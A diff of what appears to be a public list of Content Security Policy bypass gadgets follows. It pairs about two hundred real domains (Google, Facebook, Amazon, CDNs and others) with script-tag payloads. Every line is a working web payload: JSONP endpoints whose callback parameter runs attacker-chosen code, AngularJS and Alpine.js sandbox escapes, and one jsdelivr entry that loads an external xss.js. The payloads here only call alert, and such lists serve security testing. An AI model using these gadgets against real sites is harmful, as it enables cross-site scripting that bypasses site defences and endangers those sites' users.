@@ -1,72 +1,72 @@
 Domain	Code
 7b936.v.fwmrm.net	<script src="https://7b936.v.fwmrm.net/ad/g/1?nw=1&csid=1&resp=json&cbfn=alert(1)-"></script> 
-a.config.skype.com	<script src="https://a.config.skype.com/config/v1/SkypeLyncWebExperience/905_1.2.5.0?apikey=shareButton&fingerprint=0487c2fb-967c-4d8d-9635-75249326f72e&callback=alert"></script>
-a.huodong.mi.com	<script src="https://a.huodong.mi.com/postfree/postfree?callback=alert"></script>
+a.config.skype.com	<script src="https://a.config.skype.com/config/v1/SkypeLyncWebExperience/905_1.2.5.0?apikey=shareButton&fingerprint=0487c2fb-967c-4d8d-9635-75249326f72e&callback=window.alert"></script>
+a.huodong.mi.com	<script src="https://a.huodong.mi.com/postfree/postfree?callback=window.alert"></script>
 aax-us-east-retail-direct.amazon.com	<script src="https://aax-us-east-retail-direct.amazon.com/e/xsp/getAdj?callback=alert(1)-"></script>
-abr.business.gov.au <script src="https://abr.business.gov.au/json/AcnDetails.aspx?callback=prompt(1)//"></script>
+abr.business.gov.au	<script src="https://abr.business.gov.au/json/AcnDetails.aspx?callback=prompt(1)//"></script>
 abtasty.com	<script src="https://abtasty.com/wp-json?_jsonp=alert"></script>
-accdn.lpsnmedia.net	<script src="https://accdn.lpsnmedia.net/api/account/1/configuration/engagement-window/window-confs/1?cb=alert"></script>
+accdn.lpsnmedia.net	<script src="https://accdn.lpsnmedia.net/api/account/1/configuration/engagement-window/window-confs/1?cb=window.alert"></script>
 accounts.google.com	<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
 acs.aliexpress.com	<script src="https://acs.aliexpress.com/h5/mtop.aliexpress.address.shipto.division.get/1.0/?type=jsonp&dataType=jsonp&callback=alert"></script>
 acs.youku.com	<script src="https://acs.youku.com/h5/mtop.youku.playlog.open.get/1.0/?jsv=2.6.1&appKey=24679788&t=1734359327631&sign=6b8f8b6abb27c68582606eed336c887d&api=mtop.youku.playlog.open.get&v=1.0&dataType=jsonp&jsonpIncPrefix=headerRecord1734359327618&type=jsonp&callback=alert&data={%22nlid%22%3A%22XlQcF5xQrCcCAWoLKdGqIOhS%22%2C%22uid%22%3A%22%22%2C%22pageLength%22%3A100%2C%22timestamp%22%3A%221734359327617%22%2C%22appKey%22%3A%22qPbb2hfIYugHjMaj%22%2C%22appName%22%3A%22pc%22%2C%22hwClass%22%3A1%2C%22deviceName%22%3A%22web%22%2C%22isPlayController%22%3A1%2C%22ccode%22%3A%220502%22%2C%22clientDrmAbility%22%3A3}"></script>
-adhouse.pro	<script src="https://adhouse.pro/wp-json?_jsonp=alert"></script>
-admatic.com.tr	<script src="https://admatic.com.tr/wp-json?_jsonp=alert"></script>
-admixer.com	<script src="https://admixer.com/wp-json?_jsonp=alert"></script>
-adtelligent.com	<script src="https://adtelligent.com/wp-json?_jsonp=alert"></script>
-advangelists.com	<script src="https://advangelists.com/wp-json?_jsonp=alert"></script>
-advertising.com	<script src="https://advertising.com/wp-json?_jsonp=alert"></script>
-airbnb-api.arkoselabs.com	<script src="https://airbnb-api.arkoselabs.com/fc/a/?callback=alert"></script></body>
+adhouse.pro	<script src="https://adhouse.pro/wp-json?_jsonp=window.alert"></script>
+admatic.com.tr	<script src="https://admatic.com.tr/wp-json?_jsonp=window.alert"></script>
+admixer.com	<script src="https://admixer.com/wp-json?_jsonp=window.alert"></script>
+adtelligent.com	<script src="https://adtelligent.com/wp-json?_jsonp=window.alert"></script>
+advangelists.com	<script src="https://advangelists.com/wp-json?_jsonp=window.alert"></script>
+advertising.com	<script src="https://advertising.com/wp-json?_jsonp=window.alert"></script>
+airbnb-api.arkoselabs.com	<script src="https://airbnb-api.arkoselabs.com/fc/a/?callback=window.alert"></script></body>
 ajax.googleapis.com	<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 anchor.digitalocean.com	<script src="https://anchor.digitalocean.com/index.php/form/getForm?munchkinId=113-DTN-266&form=1402&callback=alert"></script>
-api-js.mixpanel.com  <script src="https://api-js.mixpanel.com/engage/?callback=alert(1)"></script>
-api-v3.tinypass.com  <script src="https://api-v3.tinypass.com/api/v3/conversion/logAutoMicroConversion?callback=alert"></script>
-api.bazaarvoice.com	<script src="https://api.bazaarvoice.com/data/batch.json?passkey=e75powr7wqhg1ah5seu00zawf&callback=alert"></script>
+api-js.mixpanel.com	<script src="https://api-js.mixpanel.com/engage/?callback=alert(1)"></script>
+api-v3.tinypass.com	<script src="https://api-v3.tinypass.com/api/v3/conversion/logAutoMicroConversion?callback=alert"></script>
+api.bazaarvoice.com	<script src="https://api.bazaarvoice.com/data/batch.json?passkey=e75powr7wqhg1ah5seu00zawf&callback=window.alert"></script>
 api.bing.com	<script src="https://api.bing.com/osjson.aspx?query=x&JsonType=callback&JsonCallback=alert"></script>
-api.braintreegateway.com  <script src="https://api.braintreegateway.com/merchants/x/client_api/v1/payment_methods/credit_cards?callback=alert"></script>
+api.braintreegateway.com	<script src="https://api.braintreegateway.com/merchants/x/client_api/v1/payment_methods/credit_cards?callback=alert"></script>
 api.chartbeat.com	<script src="https://api.chartbeat.com/toppages/?jsonp=alert(1)-"></script>
 api.cxense.com	<script src="https://api.cxense.com/profile/user/segment?callback=alert"></script>
 api.dailymotion.com	<script src="https://api.dailymotion.com/video/x5gv6be?callback=alert()"></script>
-api.duckduckgo.com	<script src="https://api.duckduckgo.com/?q=x&callback=alert&format=json"></script>
-api.flickr.com	<script src="https://api.flickr.com/services/feeds/photos_friends.gne?user_id=44979707@N00&friends=0&display_all=1&format=json&jsoncallback=alert"></script>
+api.duckduckgo.com	<script src="https://api.duckduckgo.com/?q=x&callback=window.alert&format=json"></script>
+api.flickr.com	<script src="https://api.flickr.com/services/feeds/photos_friends.gne?user_id=44979707%40N00&friends=0&display_all=1&format=json&jsoncallback=window.alert"></script>
 api.forismatic.com	<script src="https://api.forismatic.com/api/1.0/?format=jsonp&method=getQuote&jsonp=alert(1)"></script>
 api.getdrip.com	<script src="https://api.getdrip.com/client/forms/show?callback=alert(1)-"></script>
 api.github.com	<script src="https://api.github.com/search/code?callback=alert"></script>
 api.ipify.org	<script src="https://api.ipify.org/?format=jsonp&callback=alert(1)//"></script>
-api.livechatinc.com	<script src="https://api.livechatinc.com/v3.6/customer/action/get_dynamic_configuration?license_id=x&url=x&channel_type=code&jsonp=alert"></script>
+api.livechatinc.com	<script src="https://api.livechatinc.com/v3.6/customer/action/get_dynamic_configuration?license_id=x&url=x&channel_type=code&jsonp=window.alert"></script>
 api.m.jd.com	<script src="https://api.m.jd.com/api?appid=x&functionId=x&jsonp=alert(document.domain)//"></script>
 api.map.baidu.com	<script src="https://api.map.baidu.com/api?v=2.0&ak=&s=1&callback=alert(document.domain)"></script>
 api.mixpanel.com	<script src="https://api.mixpanel.com/track/?callback=alert(1337)"></script>
 api.olark.com	<script src="https://api.olark.com/2.0/visitors/z1nRAdDubyUjGyih018BZ0P04rBy00W3?_callback=alert&_method=PUT"></script>
-api.pinterest.com	<script src="https://api.pinterest.com/v1/urls/count.json?callback=alert&url=x"></script>
-api.recurly.com  <script src="https://api.recurly.com/js/v1/engage/settings?callback=alert(1)"></script>
+api.pinterest.com	<script src="https://api.pinterest.com/v1/urls/count.json?callback=window.alert&url=x"></script>
+api.recurly.com	<script src="https://api.recurly.com/js/v1/engage/settings?callback=alert(1)"></script>
 api.stackexchange.com	<script src="https://api.stackexchange.com/2.2/me?callback=alert(1)-"></script>
-api.swiftype.com	<script src="https://api.swiftype.com/api/v1/public/engines/search.json?callback=alert&engine_key=JDuYRnCLSDZzYWgBkoSB"></script>
-api.tumblr.com	<script src="https://api.tumblr.com/v2/blog/zoeappleseed.tumblr.com/posts/photo?tag=seed&offset=0&api_key=msIByDvkVk3gSr360nq2vmTkKIAvW4gNTB2dUYkvIO9NLwyxNy&jsonp=alert"></script>
-api.twitter.com	<script src="https://api.twitter.com/1/statuses/oembed.json?url=https://x.com/jack/status/20&callback=alert"></script>
-api.usabilla.com	<script src="https://api.usabilla.com/v2/feedback/c263014c1857.config?jsonp=alert"></script>
+api.swiftype.com	<script src="https://api.swiftype.com/api/v1/public/engines/search.json?callback=window.alert&engine_key=JDuYRnCLSDZzYWgBkoSB"></script>
+api.tumblr.com	<script src="https://api.tumblr.com/v2/blog/zoeappleseed.tumblr.com/posts/photo?tag=seed&offset=0&api_key=msIByDvkVk3gSr360nq2vmTkKIAvW4gNTB2dUYkvIO9NLwyxNy&jsonp=window.alert"></script>
+api.twitter.com	<script src="https://api.twitter.com/1/statuses/oembed.json?url=https%3A%2F%2Fx.com%2Fjack%2Fstatus%2F20&callback=window.alert"></script>
+api.usabilla.com	<script src="https://api.usabilla.com/v2/feedback/c263014c1857.config?jsonp=window.alert"></script>
 api.vk.com	<script src="https://api.vk.com/method/wall.get?callback=alert(1337)"></script>
 api.wordpress.org	<script src="https://api.wordpress.org/stats/plugin/1.0/?slug=x&callback=alert"></script>
-api.x.com	<script src="https://api.x.com/1/statuses/oembed.json?url=https://x.com/jack/status/20&callback=alert"></script>
+api.x.com	<script src="https://api.x.com/1/statuses/oembed.json?url=https%3A%2F%2Fx.com%2Fjack%2Fstatus%2F20&callback=window.alert"></script>
 apis.google.com	<iframe id=x src="/%GG"></iframe><script src="https://apis.google.com/complete/search?client=chrome&q=<script>alert(document.domain)</script>&callback=x.contentDocument.write"></script>
 apis.google.com	<script src="https://apis.google.com/complete/search?client=chrome&q=x&callback=alert"></script>
-apis.google.com <script src="https://apis.google.com/js/googleapis.proxy.js?onload=alert"></script>
-apis.google.com <script src='https://apis.google.com/js/random%22-alert(document.domain)-%22//api.js?onload=random'></script>
+apis.google.com	<script src="https://apis.google.com/js/googleapis.proxy.js?onload=alert"></script>
+apis.google.com	<script src='https://apis.google.com/js/random%22-alert(document.domain)-%22//api.js?onload=random'></script>
 app-sjint.marketo.com	<script src="https://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>
 app.hushly.com	<script src="https://app.hushly.com/runtime/visitor?callback=alert(1)//"></script>
 app.link	<script src="https://app.link/_r?sdk=web&callback=alert"></script>
-appointlet.com	<script src="https://appointlet.com/wp-json?_jsonp=alert"></script>
+appointlet.com	<script src="https://appointlet.com/wp-json?_jsonp=window.alert"></script>
 apps.bdimg.com	<body ng-app ng-csp><script src="https://apps.bdimg.com/libs/angular.js/1.4.6/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 assets.grubhub.com	<body ng-app ng-csp><script src="https://assets.grubhub.com/libs/js/angular/1.8.3/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 assets.guim.co.uk	<script src=https://assets.guim.co.uk/polyfill.io/v3/polyfill.min.js?callback=alert></script>
-assets.twitch.tv  <script src="https://assets.twitch.tv/eppo/api/flag-config/v1/config?sdkName=js-sdk-client&sdkVersion=3.1.2&apiKey=3mv-BKCSZJDyZrwfqK86har6u13NgxRh.ZWg9bTRsZHJnLmUuZXBwby5jbG91ZCZjcz1tNGxkcmc&callback=alert()">
-avada.io	<script src="https://avada.io/wp-json?_jsonp=alert"></script>
-bildirt.com	<script src="https://bildirt.com/wp-json?_jsonp=alert"></script>
-boards.greenhouse.io  <script src="https://boards.greenhouse.io/uncacheable_attributes/presigned_fields?callback=alert"></script>
-bookmark.hatenaapis.com	<script src="https://bookmark.hatenaapis.com/count/entry?url=x&callback=alert"></script>
-buy.tinypass.com   <script src="https://buy.tinypass.com/api/v3/anon/template/loadTemplateContext?callback=alert"></script>
-c.y.qq.com	<script src="https://c.y.qq.com/v8/fcg-bin/v8.fcg?&notice=0&format=jsonp&channel=singer&page=list&jsonpCallback=alert"></script>
+assets.twitch.tv	<script src="https://assets.twitch.tv/eppo/api/flag-config/v1/config?sdkName=js-sdk-client&sdkVersion=3.1.2&apiKey=3mv-BKCSZJDyZrwfqK86har6u13NgxRh.ZWg9bTRsZHJnLmUuZXBwby5jbG91ZCZjcz1tNGxkcmc&callback=alert()">
+avada.io	<script src="https://avada.io/wp-json?_jsonp=window.alert"></script>
+bildirt.com	<script src="https://bildirt.com/wp-json?_jsonp=window.alert"></script>
+boards.greenhouse.io	<script src="https://boards.greenhouse.io/uncacheable_attributes/presigned_fields?callback=window.alert"></script>
+bookmark.hatenaapis.com	<script src="https://bookmark.hatenaapis.com/count/entry?url=x&callback=window.alert"></script>
+buy.tinypass.com	<script src="https://buy.tinypass.com/api/v3/anon/template/loadTemplateContext?callback=alert"></script>
+c.y.qq.com	<script src="https://c.y.qq.com/v8/fcg-bin/v8.fcg?notice=0&format=jsonp&channel=singer&page=list&jsonpCallback=window.alert"></script>
 cas.criteo.com	<script src="https://cas.criteo.com/delivery/0.1/napi.jsonp?zoneid=377600&callback=alert"></script>
-cdn.arkoselabs.com	<script src="https://cdn.arkoselabs.com/fc/a/?callback=alert"></script>
+cdn.arkoselabs.com	<script src="https://cdn.arkoselabs.com/fc/a/?callback=window.alert"></script>
 cdn.bootcdn.net	<script src="https://cdn.bootcdn.net/ajax/libs/angular.js/1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 cdn.bootcss.com	<script src="https://cdn.bootcss.com/angular.js/1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 cdn.jsdelivr.net	<script src="https://cdn.jsdelivr.net/combine/gh/moment/moment@develop/min/moment.min.js,gh/renniepak/xss/xss.js"></script> 
@@ -79,83 +79,83 @@ cdn.syncfusion.com	<body ng-app ng-csp><script src="https://cdn.syncfusion.com/j
 cdnjs.cloudflare.com	<script src="https://cdnjs.cloudflare.com/ajax/libs/alpinejs/3.10.5/cdn.min.js"></script><div x-init="alert(1)">
 cdnjs.cloudflare.com	<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 challenges.cloudflare.com	<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=alert"></script>
-client-api.arkoselabs.com	<script src="https://client-api.arkoselabs.com/fc/a/?callback=alert"></script>
+client-api.arkoselabs.com	<script src="https://client-api.arkoselabs.com/fc/a/?callback=window.alert"></script>
 client.crisp.chat	<script src="https://client.crisp.chat/settings/website/x/?callback=-alert(1)//"></script>
-clientauthconfig.clients6.google.com  <script src="https://clientauthconfig.clients6.google.com/v1/clients?callback=alert(1)"></script>
+clientauthconfig.clients6.google.com	<script src="https://clientauthconfig.clients6.google.com/v1/clients?callback=alert(1)"></script>
 clients1.google.com	<script src="https://clients1.google.com/complete/search?callback=alert&q=PIC&nolabels=t&client=youtube&ds=yt&_=1361575554883"></script>
 clients6.google.com	<script src="https://clients6.google.com/drive/v2beta/files?callback=alert(1)"></script>
-cloudinary.com	<script src="https://cloudinary.com/wp-json?_jsonp=alert"></script>
-cloudusersettings-pa.clients6.google.com  <script src="https://cloudusersettings-pa.clients6.google.com/v1alpha1/settings/CONSOLE_PINS/keys/CLOUD?callback=alert(1)"></script>
+cloudinary.com	<script src="https://cloudinary.com/wp-json?_jsonp=window.alert"></script>
+cloudusersettings-pa.clients6.google.com	<script src="https://cloudusersettings-pa.clients6.google.com/v1alpha1/settings/CONSOLE_PINS/keys/CLOUD?callback=alert(1)"></script>
 code.angularjs.org	<script src="https://code.angularjs.org/1.8.2/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 commerce.coinbase.com	<script src="https://commerce.coinbase.com/v1/checkout.js?onload=alert"></script>
-common.like.naver.com	<script src="https://common.like.naver.com/v1/search/contents?callback=alert&q=x"></script>
-connect.mail.ru	<script src="https://connect.mail.ru/share_count?url_list=x&callback=1&func=alert"></script>
-connectad.io	<script src="https://connectad.io/wp-json?_jsonp=alert"></script>
+common.like.naver.com	<script src="https://common.like.naver.com/v1/search/contents?callback=window.alert&q=x"></script>
+connect.mail.ru	<script src="https://connect.mail.ru/share_count?url_list=x&callback=1&func=window.alert"></script>
+connectad.io	<script src="https://connectad.io/wp-json?_jsonp=window.alert"></script>
 content.akamai.com	<script src="https://content.akamai.com/index.php/form/getForm?munchkinId=113-DTN-266&form=1402&callback=alert"></script>
-content.googleapis.com <script src="https://content.googleapis.com/discovery/v1/apis?callback=alert(document.domain);var%20ignorethat="></script>
+content.googleapis.com	<script src="https://content.googleapis.com/discovery/v1/apis?callback=alert(document.domain);var%20ignorethat="></script>
 count-server.sharethis.com	<script src="https://count-server.sharethis.com/v2.0/get_counts?cb=alert"></script>
-ct.beslist.nl  <script src="https://ct.beslist.nl/ct_refresh?shopid=%22;%0a%0dalert(1);%20//%20"></script>
-cubepile.com	<script src="https://cubepile.com/wp-json?_jsonp=alert"></script>
+ct.beslist.nl	<script src="https://ct.beslist.nl/ct_refresh?shopid=%22;%0a%0dalert(1);%20//%20"></script>
+cubepile.com	<script src="https://cubepile.com/wp-json?_jsonp=window.alert"></script>
 d.adroll.com	<script src="https://d.adroll.com/user_attrs?advertisable_eid=5L5IV3X4ZNCUZFMLN5KKOD&jsonp=alert(document.domain)"></script>
-d.la3-c2-ia5.salesforceliveagent.com	<script src="https://d.la3-c2-ia5.salesforceliveagent.com/chat/rest/EmbeddedService/EmbeddedServiceConfig.jsonp?org_id=00D40000000MvPv&EmbeddedServiceConfig.configName=Support_Brandfolder_Chat_Agents&callback=alert&version=48"></script>
+d.la3-c2-ia5.salesforceliveagent.com	<script src="https://d.la3-c2-ia5.salesforceliveagent.com/chat/rest/EmbeddedService/EmbeddedServiceConfig.jsonp?org_id=00D40000000MvPv&EmbeddedServiceConfig.configName=Support_Brandfolder_Chat_Agents&callback=window.alert&version=48"></script>
 d1xrp9zhb3ks3c.cloudfront.net	<body ng-app ng-csp><script src="https://d1xrp9zhb3ks3c.cloudfront.net/web/changessalon/node_modules/angular/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 dable.io	<script src="https://dable.io/wp-json?_jsonp=alert"></script>
-dblp.org	<script src="https://dblp.org/search/venue/api?q=&h=1000&c=0&rd=1a&format=jsonp&callback=alert"></script>
-demandbase.com	<script src="https://demandbase.com/wp-json?_jsonp=alert"></script>
-demo.matomo.cloud	<script src="https://demo.matomo.cloud/?module=API&method=Overlay.getTranslations&idSite=1&format=JSON&callback=alert"></script>
+dblp.org	<script src="https://dblp.org/search/venue/api?q=&h=1000&c=0&rd=1a&format=jsonp&callback=alert%281337%29"></script>
+demandbase.com	<script src="https://demandbase.com/wp-json?_jsonp=window.alert"></script>
+demo.matomo.cloud	<script src="https://demo.matomo.cloud/?module=API&method=Overlay.getTranslations&idSite=1&format=JSON&callback=window.alert"></script>
 dev.virtualearth.net	<script src="https://dev.virtualearth.net/REST/v1/Imagery/Metadata/Road?jsonp=alert(document.domain);//"></script>
-dit.whatsapp.net  <script src="https://dit.whatsapp.net/deidentified_telemetry?callback=alert"></script>
+dit.whatsapp.net	<script src="https://dit.whatsapp.net/deidentified_telemetry?callback=window.alert"></script>
 documentation-resources.opendatasoft.com	<script src="https://documentation-resources.opendatasoft.com/api/datasets/1.0/doc-geonames-cities-5000/?format=jsonp&callback=confirm(1);"></script>
-dpm.demdex.net	<script src="https://dpm.demdex.net/id?d_cb=alert"></script>
-dreamwater.com.tr	<script src="https://dreamwater.com.tr/wp-json?_jsonp=alert"></script>
-drivefrontend-pa.clients6.google.com  <script src="https://drivefrontend-pa.clients6.google.com/v1/changes:getLargestChangeId?callback=alert(1)"></script>
+dpm.demdex.net	<script src="https://dpm.demdex.net/id?d_cb=window.alert"></script>
+dreamwater.com.tr	<script src="https://dreamwater.com.tr/wp-json?_jsonp=window.alert"></script>
+drivefrontend-pa.clients6.google.com	<script src="https://drivefrontend-pa.clients6.google.com/v1/changes:getLargestChangeId?callback=alert(1)"></script>
 dynamic.criteo.com	<script src="https://dynamic.criteo.com/js/ld/s2s.js?p=1&c=1&j=alert"></script>
-e.cquotient.com  <script src="https://e.cquotient.com/recs/bflp-Wells/cart_recomender?callback=alert"></script>
+e.cquotient.com	<script src="https://e.cquotient.com/recs/bflp-Wells/cart_recomender?callback=alert"></script>
 elysiumwebsite.s3.amazonaws.com	<body ng-app ng-csp><script src="//elysiumwebsite.s3.amazonaws.com/uploads/blog-media/rockstar/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
-eu.battle.net	<script src="https://eu.battle.net/support/update/json?callback=alert"></script>
-fast.wistia.com	<script src="https://fast.wistia.com/embed/medias/o75jtw7654.json?callback=alert"></script>
-foremedia.net	<script src="https://foremedia.net/wp-json?_jsonp=alert"></script>
-forms.hsforms.com	<script src="https://forms.hsforms.com/embed/v3/form/1/00000000-0000-0000-0000-000000000000?callback=alert"></script>
-forms.hubspot.com	<script src="https://forms.hubspot.com/embed/v3/form/2059467/2e1a1b5b-27bb-447d-aac4-0b87c1e88fec?callback=alert"></script>
+eu.battle.net	<script src="https://eu.battle.net/support/update/json?callback=window.alert"></script>
+fast.wistia.com	<script src="https://fast.wistia.com/embed/medias/o75jtw7654.json?callback=window.alert"></script>
+foremedia.net	<script src="https://foremedia.net/wp-json?_jsonp=window.alert"></script>
+forms.hsforms.com	<script src="https://forms.hsforms.com/embed/v3/form/1/00000000-0000-0000-0000-000000000000?callback=window.alert"></script>
+forms.hubspot.com	<script src="https://forms.hubspot.com/embed/v3/form/2059467/2e1a1b5b-27bb-447d-aac4-0b87c1e88fec?callback=window.alert"></script>
 g2.gumgum.com	<script src="https://g2.gumgum.com/hbid/imp?jsonp=alert(1)"></script>
 geolocation.onetrust.com	<script src="https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location/alert"></script>
-gist.github.com	<script src="https://gist.github.com/renniepak/e7afcd7e727e1a0c481d955ba10441a9.json?callback=alert"></script>
+gist.github.com	<script src="https://gist.github.com/renniepak/e7afcd7e727e1a0c481d955ba10441a9.json?callback=window.alert"></script>
 global.apis.naver.com	<script src="https://global.apis.naver.com/commentBox/cbox/web_neo_list_jsonp.json?_callback=alert"></script>
-go.dev	<script src="https://go.dev/blog/.json?jsonp=alert"></script>
-go.recordedfuture.com  <script src="https://go.recordedfuture.com/index.php/form/getForm?munchkinId=x&form=1&callback=alert"></script>
+go.dev	<script src="https://go.dev/blog/.json?jsonp=window.alert"></script>
+go.recordedfuture.com	<script src="https://go.recordedfuture.com/index.php/form/getForm?munchkinId=x&form=1&callback=alert"></script>
 go.snyk.io	<script src="https://go.snyk.io/index.php/form/getForm?munchkinId=677-THP-415&form=1461&callback=alert"></script>
-google.com  <script src="https://google.com/complete/search?client=chrome&jsonp=alert(1)"></script>
-graph.facebook.com	<script src="https://graph.facebook.com/?id=1337&callback=alert"></script>
-graph.instagram.com	<script src=https://graph.instagram.com/logging_client_events?callback=alert></script>
-graph.whatsapp.net  <script src="https://graph.whatsapp.net/wa_qpl_data?callback=alert"></script>
-gravatar.com	<script src="https://gravatar.com/930fc2e7cd239606c398bff5b5fc12e7.json?callback=alert"></script>
+google.com	<script src="https://google.com/complete/search?client=chrome&jsonp=alert(1)"></script>
+graph.facebook.com	<script src="https://graph.facebook.com/?id=1337&callback=window.alert"></script>
+graph.instagram.com	<script src=https://graph.instagram.com/logging_client_events?callback=window.alert></script>
+graph.whatsapp.net	<script src="https://graph.whatsapp.net/wa_qpl_data?callback=window.alert"></script>
+gravatar.com	<script src="https://gravatar.com/930fc2e7cd239606c398bff5b5fc12e7.json?callback=window.alert"></script>
 gstatic.com	<body ng-app ng-csp><script src="//gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 gstatic.com	<script src='https://gstatic.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
-gum.criteo.com	<script src="https://gum.criteo.com/sync?c=123&r=2&a=1&j=alert"></script>
+gum.criteo.com	<script src="https://gum.criteo.com/sync?c=123&r=2&a=1&j=window.alert"></script>
 hcaptcha.com	<script src="https://hcaptcha.com/1/api.js?onload=alert&render=explicit"></script>
-help.afterpay.com	<script src="https://help.afterpay.com/sc/faye/?message=[{%22channel%22:%22%22}]&jsonp=alert"></script>
+help.afterpay.com	<script src="https://help.afterpay.com/sc/faye/?message=%5B%7B%22channel%22%3A%22%22%7D%5D&jsonp=window.alert"></script>
 i.ytimg.com	<body ng-app ng-csp><script src="https://i.ytimg.com/yts/jslib/angular.min-vfl8oYsy-.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 iam.clients6.google.com	<script src="https://iam.clients6.google.com/v1/projects/gen-lang-client-1/serviceAccounts?callback=alert(1)"></script>
 id.cxense.com	<script src=https://id.cxense.com/public/user/id?callback=alert></script>
 identitytoolkit.googleapis.com	<script src="https://identitytoolkit.googleapis.com/v1/projects?callback=alert(1)"></script>
-improvedigital.com	<script src="https://improvedigital.com/wp-json?_jsonp=alert"></script>
+improvedigital.com	<script src="https://improvedigital.com/wp-json?_jsonp=window.alert"></script>
 info.cloudflare.com	<script src="https://info.cloudflare.com//index.php/form/getForm?munchkinId=194-VVC-221&form=1077&callback=alert"></script>
 info.elastic.co	<script src="https://info.elastic.co/index.php/form/getForm?munchkinId=813-MAM-392&form=6196&callback=alert"></script>
 inno.blob.core.windows.net	<body ng-app ng-csp><script src="//inno.blob.core.windows.net/new/libs/AngularJS/1.2.1/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
 investor.coinbase.com	<script src="https://investor.coinbase.com/feed/People.svc/GetPeopleList?callback=confirm(document.domain);"></script>
 ipinfo.io	<script src="https://ipinfo.io/?format=jsonp&callback=alert"></script>
 itunes.apple.com	<script src="https://itunes.apple.com/se/rss/toppodcasts/json?callback=alert"></script>
-jewelbetting.co	<script src="https://jewelbetting.co/wp-json?_jsonp=alert"></script>
-jquery.com	<script src="https://jquery.com/wp-json?_jsonp=alert"></script>
+jewelbetting.co	<script src="https://jewelbetting.co/wp-json?_jsonp=window.alert"></script>
+jquery.com	<script src="https://jquery.com/wp-json?_jsonp=window.alert"></script>
 js.hcaptcha.com	<script src="https://js.hcaptcha.com/1/api.js?onload=alert&render=explicit"></script>
 jsconfig.adsafeprotected.com	<script src=https://jsconfig.adsafeprotected.com/jsconfig/rjss/st/1/1/skeleton.js?cbName=x;var%20__IASScope;alert(1)></script>
-kampyle.com	<script src="https://kampyle.com/wp-json?_jsonp=alert"></script>
+kampyle.com	<script src="https://kampyle.com/wp-json?_jsonp=window.alert"></script>
 kbcprod.service-now.com	<body ng-app ng-csp><script src="https://kbcprod.service-now.com/scripts/angular_includes_1.5.11.jsx"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
-kck3hlb9.dashlane.com  <script src="https://kck3hlb9.dashlane.com/1/installerlog/create?callback=alert"></script>
+kck3hlb9.dashlane.com	<script src="https://kck3hlb9.dashlane.com/1/installerlog/create?callback=window.alert"></script>
 kendo.cdn.telerik.com	<body ng-app ng-csp><script src="https://kendo.cdn.telerik.com/2015.2.805/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 lghnh-mkt-prod1.campaign.adobe.com	<script src="https://lghnh-mkt-prod1.campaign.adobe.com/lgh/at_seg_list.jssp?callback=alert(1)-"></script>
-libsyn.com	<script src="https://libsyn.com/wp-json?_jsonp=alert"></script>
-links.services.disqus.com	<script src="https://links.services.disqus.com/api/ping?format=jsonp&key=cfdfcf52dffd0a702a61bad27507376d&loc=http%3A%2F%2Fabcnews.go.com%2Fblogs%2Fhealth%2F2013%2F03%2F21%2F1-in-10-u-s-deaths-blamed-on-salt%2F&subId=2329827&v=1&jsonp=alert"></script>
+libsyn.com	<script src="https://libsyn.com/wp-json?_jsonp=window.alert"></script>
+links.services.disqus.com	<script src="https://links.services.disqus.com/api/ping?format=jsonp&key=cfdfcf52dffd0a702a61bad27507376d&loc=http%3A%2F%2Fabcnews.go.com%2Fblogs%2Fhealth%2F2013%2F03%2F21%2F1-in-10-u-s-deaths-blamed-on-salt%2F&subId=2329827&v=1&jsonp=alert%281337%29"></script>
 locate.pricespider.com	<script src="https://locate.pricespider.com/?callback=alert(1)"></script>
 lptag.liveperson.net	<script src="https://lptag.liveperson.net/lptag/api/account/1/configuration/applications/taglets/.jsonp?v=2.0&cb=alert(1)-"></script>
 m.media-amazon.com	<body ng-app ng-csp><script src="https://m.media-amazon.com/images/I/81cx8O4at9L.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
@@ -168,117 +168,117 @@ maps.google.lv	<script src="https://maps.google.lv/maps/api/js?sensor=false&call
 maps.google.ru	<script src="https://maps.google.ru/maps/api/js?sensor=false&callback=alert(1)"></script>
 maps.googleapis.com	<script src="https://maps.googleapis.com/maps/api/js?callback=alert(1337)"></script>
 mc.yandex.ru	<script src="https://mc.yandex.ru/watch/9528925/1?wmode=5&callback=alert"></script>
